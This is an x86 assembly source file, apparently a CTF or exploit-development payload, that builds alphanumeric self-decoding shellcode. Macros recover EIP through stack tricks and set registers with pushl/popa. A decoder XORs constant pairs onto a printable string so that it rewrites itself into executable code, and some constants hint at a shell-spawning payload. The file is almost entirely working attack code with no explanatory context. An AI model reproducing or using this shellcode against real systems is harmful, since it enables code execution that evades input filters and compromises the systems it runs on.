.macro str3
	.string "11111a11d1111a1a411111111115"
.endm

.macro pmovl x, y
	pushl \x
	popl \y
.endm

.macro movl_eip reg
.rept 4
	decl %esp
.endr
	popl \reg
.endm

.macro set_regs eax=%eax, ecx=%ecx, edx=%edx, ebx=%ebx, ebp=%ebp, esi=%esi, edi=%edi, buried=%eax
	pushl \eax
	pushl \ecx
	pushl \edx
	pushl \ebx
	pushl \buried		# esp += 4 instead of esp = pop()
	pushl \ebp
	pushl \esi
	pushl \edi
	popa
.endm

.macro nopnop
	incl %edi
	decl %edi
.endm

.macro BP
#	.byte 0xcc
.endm

.macro zero_eax
	pmovl $0x41414141, %eax
	xorl $0x41414141, %eax
.endm

.set OFFSET, 0x37
.set EDI, 0x59

.macro fix_ecx
.endm

.macro decoder
	pmovl %ebp, %eax
	pushl %edx
	xorb %al, 0x39(%esp, %esi, 1)
	popl %eax
	xorl $0x3058586a, %eax
	xorl $0x57316231, %eax
	xorl %eax, OFFSET(%ecx, %edi, 2)
	incl %edi
	incl %edi
	
	pmovl %ebp, %eax
	pushl %edx
	xorb %al, 0x37(%esp, %esi, 1)
	xorb %al, 0x39(%esp, %esi, 1)
	popl %eax
	xorl $0x30583052, %eax
	xorl $0x47617531, %eax
	xorl %eax, OFFSET(%ecx, %edi, 2)
	incl %edi
	incl %edi
	
	pmovl %ebp, %eax
	pushl %edx
	xorb %al, 0x36(%esp, %esi, 1)
	xorb %al, 0x38(%esp, %esi, 1)
	popl %eax
	xorl $0x53305830, %eax
	xorl $0x3146327a, %eax
	xorl %eax, OFFSET(%ecx, %edi, 2)
	incl %edi
	incl %edi
	
	pmovl %ebp, %eax
	pushl %edx
	xorb %al, 0x37(%esp, %esi, 1)
	xorb %al, 0x38(%esp, %esi, 1)
	xorb %al, 0x39(%esp, %esi, 1)
	popl %eax
	xorl $0x30303057, %eax
	xorl $0x764e5361, %eax
	xorl %eax, OFFSET(%ecx, %edi, 2)
	incl %edi
	incl %edi
	
	pmovl %ebp, %eax
	pushl %edx
	xorb %al, 0x36(%esp, %esi, 1)
	xorb %al, 0x37(%esp, %esi, 1)
	xorb %al, 0x38(%esp, %esi, 1)
	xorb %al, 0x39(%esp, %esi, 1)
	popl %eax
	xorl $0x30303030, %eax
	xorl $0x31313138, %eax
	xorl %eax, OFFSET(%ecx, %edi, 2)
	incl %edi
	incl %edi
	
	pmovl $0x6e69627a, %eax
	xorl $0x31313164, %eax
	xorl %eax, OFFSET(%ecx, %edi, 2)
	incl %edi
	incl %edi
	
	pmovl %ebp, %eax
	pushl %edx
	xorb %al, 0x39(%esp, %esi, 1)
	popl %eax
	xorl $0x3068737a, %eax
	xorl $0x5a313164, %eax
	xorl %eax, OFFSET(%ecx, %edi, 2)
	
.endm


.macro init_reg
	movl_eip %edx
	pushl %edx		# %ebp ~ %eip
	zero_eax
	pushl %eax		# %esi = 0
	decl %eax
	xorb $0x35, %al
	pushl %eax		# %edi = -0x36
	popa
	pmovl %ebp, %ecx
	pmovl %esi, %eax
	decl %eax
	pmovl %eax, %edx
	xorl $0x30303030, %eax
	set_regs eax=%edx, ebx=%edx, ebp=%eax, esi=%edi, edi=$EDI
	incl %edx
	BP
# %eax = -1
# %ebx = -1
# %ecx ~ %eip
# %edx = 0
# %esi = -0x36
# %edi = -0x36
# %ebp = 0xcdcdcdcd = 0xffffffff ^ 0x30303030
.endm

.text
.globl _start
_start:
	init_reg
decoder:
	decoder
	BP
str:
	str3

